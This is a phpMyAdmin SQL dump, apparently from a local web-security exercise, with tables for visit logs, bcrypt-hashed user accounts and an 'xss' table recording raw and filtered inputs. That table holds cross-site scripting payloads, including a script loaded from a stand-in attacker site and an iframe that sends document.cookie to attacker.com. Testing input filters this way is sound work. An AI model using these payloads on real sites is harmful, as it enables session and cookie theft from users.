-- phpMyAdmin SQL Dump
-- version 5.1.1
-- https://www.phpmyadmin.net/
--
-- Host: 127.0.0.1
-- Generation Time: Mar 29, 2022 at 03:48 PM
-- Server version: 10.4.22-MariaDB
-- PHP Version: 7.4.27

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `secret`
--

-- --------------------------------------------------------

--
-- Table structure for table `log`
--

CREATE TABLE `log` (
  `id_log` int(11) NOT NULL,
  `user_agent` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `ip_address` varchar(15) COLLATE utf8_unicode_ci NOT NULL,
  `country` varchar(128) COLLATE utf8_unicode_ci NOT NULL,
  `date_time` datetime NOT NULL,
  `device_type` enum('phone','tablet','computer') COLLATE utf8_unicode_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Dumping data for table `log`
--

INSERT INTO `log` (`id_log`, `user_agent`, `ip_address`, `country`, `date_time`, `device_type`) VALUES
(1, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0', '127.0.0.1', '', '2022-03-08 22:15:43', 'computer'),
(2, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.31', '::1', '', '2022-03-08 22:16:01', 'computer'),
(3, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.31', '::1', '', '2022-03-08 22:16:24', 'computer'),
(4, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.31', '::1', '', '2022-03-08 22:18:21', 'computer'),
(5, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0', '185.90.134.203', 'Serbia', '2022-03-08 22:25:50', 'computer'),
(6, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.31', '2001:67c:2660:4', '', '2022-03-08 22:26:47', 'computer'),
(7, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0', '185.90.134.203', 'Serbia', '2022-03-08 22:29:22', 'computer'),
(8, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.31', '2001:67c:2660:4', '', '2022-03-08 22:29:35', 'computer'),
(9, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0', '127.0.0.1', '', '2022-03-08 22:34:22', 'computer'),
(10, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0', '127.0.0.1', '', '2022-03-27 20:15:10', 'computer'),
(11, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0', '127.0.0.1', '', '2022-03-27 20:17:04', 'computer'),
(12, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0', '185.90.134.203', 'Serbia', '2022-03-28 21:14:27', 'computer'),
(13, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36 OPR/84.0.4316.42', '2001:67c:2628:6', '', '2022-03-28 21:15:20', 'computer'),
(14, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0', '127.0.0.1', '', '2022-03-28 21:15:44', 'computer'),
(15, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0', '127.0.0.1', '', '2022-03-28 21:16:13', 'computer'),
(16, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36 Edg/99.0.1150.55', '::1', '', '2022-03-28 21:16:37', 'computer'),
(17, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0', '185.90.134.203', 'Serbia', '2022-03-28 21:19:04', 'computer'),
(18, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0', '185.90.134.203', 'Serbia', '2022-03-28 21:19:26', 'computer'),
(19, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0', '185.90.134.203', 'Serbia', '2022-03-28 21:20:42', 'computer'),
(20, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0', '185.90.134.203', 'Serbia', '2022-03-28 21:21:25', 'computer'),
(21, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0', '185.90.134.203', 'Serbia', '2022-03-28 21:22:09', 'computer'),
(22, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0', '127.0.0.1', '', '2022-03-28 21:22:32', 'computer');

-- --------------------------------------------------------

--
-- Table structure for table `users_bcrypt`
--

CREATE TABLE `users_bcrypt` (
  `id` int(11) NOT NULL,
  `username` varchar(20) CHARACTER SET utf8 NOT NULL,
  `password` varchar(255) CHARACTER SET utf8 NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Dumping data for table `users_bcrypt`
--

INSERT INTO `users_bcrypt` (`id`, `username`, `password`) VALUES
(1, 'john', '$2y$10$MZrl.ErpUsWHeter2h85neLboDfvGhW7Zllwp8DXr3Nk.GJ8bVkTm'),
(2, 'marc', '$2y$10$i9i2UdUknnVpueToj2HHEeiECwOwOKTH7RAH00tCYuHkYsFLI1WDG'),
(3, 'php', '$2y$10$YsZiOgzLI2230PlUUdWf9uCccwVs7XDnRsegUrNpanbBQfuJ724Ei'),
(4, 'root', '$2y$10$PobWrV0qaTot6oHEfk3e1.yVFWO/oFRyMp8TshWmCNFLCjQIopUg6'),
(6, 'admin', '$2y$10$W8LiEg9D9OMCFJSxI1GJ0u/q1Q2DGkJ6A/QeIXVQqMVKpdPwoLKF.');

-- --------------------------------------------------------

--
-- Table structure for table `users_web`
--

CREATE TABLE `users_web` (
  `id_user` int(11) NOT NULL,
  `username` varchar(30) COLLATE utf8_unicode_ci NOT NULL,
  `firstname` varchar(30) COLLATE utf8_unicode_ci NOT NULL,
  `lastname` varchar(30) COLLATE utf8_unicode_ci NOT NULL,
  `password` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `email` varchar(40) COLLATE utf8_unicode_ci NOT NULL,
  `token` char(40) COLLATE utf8_unicode_ci NOT NULL,
  `registration_expires` datetime NOT NULL,
  `active` smallint(1) NOT NULL DEFAULT 0,
  `code_password` char(40) COLLATE utf8_unicode_ci NOT NULL,
  `new_password_expires` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Dumping data for table `users_web`
--

INSERT INTO `users_web` (`id_user`, `username`, `firstname`, `lastname`, `password`, `email`, `token`, `registration_expires`, `active`, `code_password`, `new_password_expires`) VALUES
(1, 'john', 'John', 'Malkowich', '$2y$10$Lrtl9YZAjyjp8ptP6Jg4CeRd3PXHcBff2et007wuj7Cce97SZ0zfq', 'john@gmail.com', '', '2021-04-17 21:53:58', 1, '', '2021-04-17 21:53:58');

-- --------------------------------------------------------

--
-- Table structure for table `user_email_failure`
--

CREATE TABLE `user_email_failure` (
  `id_user_email_failure` int(11) NOT NULL,
  `id_user_web` int(11) NOT NULL,
  `date_time_added` datetime NOT NULL,
  `date_time_tried` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- --------------------------------------------------------

--
-- Table structure for table `xss`
--

CREATE TABLE `xss` (
  `id_xss` int(11) NOT NULL,
  `input` varchar(250) NOT NULL,
  `filtered_input` varchar(250) NOT NULL,
  `date_time` datetime NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `xss`
--

INSERT INTO `xss` (`id_xss`, `input`, `filtered_input`, `date_time`) VALUES
(1, '<script src=\"https://atackersite.com/script.js\"></script>', '', '0000-00-00 00:00:00'),
(2, '<script src=\"https://atackersite.com/script.js\"></script>', '', '0000-00-00 00:00:00'),
(3, '<script src=\"https://atackersite.com/script.js\"></script>', '&lt;script src=&quot;https://atackersite.com/script.js&quot;&gt;&lt;/script&gt;', '0000-00-00 00:00:00'),
(4, '<script>document.write(\'<iframe src=\"http://attacker.com?cookie=\' + escape(document.cookie) + \'\" height=0 width=0 />\');</script>', '', '0000-00-00 00:00:00'),
(5, '<script>document.write(\'<iframe src=\"http://attacker.com?cookie=\' + escape(document.cookie) + \'\" height=0 width=0 />\');</script>', '', '2022-03-28 21:55:32'),
(6, '<img src=\"http://url.to.file.which/not.exist\" onerror=alert(document.cookie);>', '', '2022-03-28 21:57:55');

--
-- Indexes for dumped tables
--

--
-- Indexes for table `log`
--
ALTER TABLE `log`
  ADD PRIMARY KEY (`id_log`);

--
-- Indexes for table `users_bcrypt`
--
ALTER TABLE `users_bcrypt`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `users_web`
--
ALTER TABLE `users_web`
  ADD PRIMARY KEY (`id_user`);

--
-- Indexes for table `user_email_failure`
--
ALTER TABLE `user_email_failure`
  ADD PRIMARY KEY (`id_user_email_failure`),
  ADD KEY `id_user_web` (`id_user_web`);

--
-- Indexes for table `xss`
--
ALTER TABLE `xss`
  ADD PRIMARY KEY (`id_xss`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `log`
--
ALTER TABLE `log`
  MODIFY `id_log` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=23;

--
-- AUTO_INCREMENT for table `users_bcrypt`
--
ALTER TABLE `users_bcrypt`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=7;

--
-- AUTO_INCREMENT for table `users_web`
--
ALTER TABLE `users_web`
  MODIFY `id_user` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=8;

--
-- AUTO_INCREMENT for table `user_email_failure`
--
ALTER TABLE `user_email_failure`
  MODIFY `id_user_email_failure` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `xss`
--
ALTER TABLE `xss`
  MODIFY `id_xss` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=7;

--
-- Constraints for dumped tables
--

--
-- Constraints for table `user_email_failure`
--
ALTER TABLE `user_email_failure`
  ADD CONSTRAINT `user_email_failure_ibfk_1` FOREIGN KEY (`id_user_web`) REFERENCES `users_web` (`id_user`) ON DELETE CASCADE ON UPDATE CASCADE;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
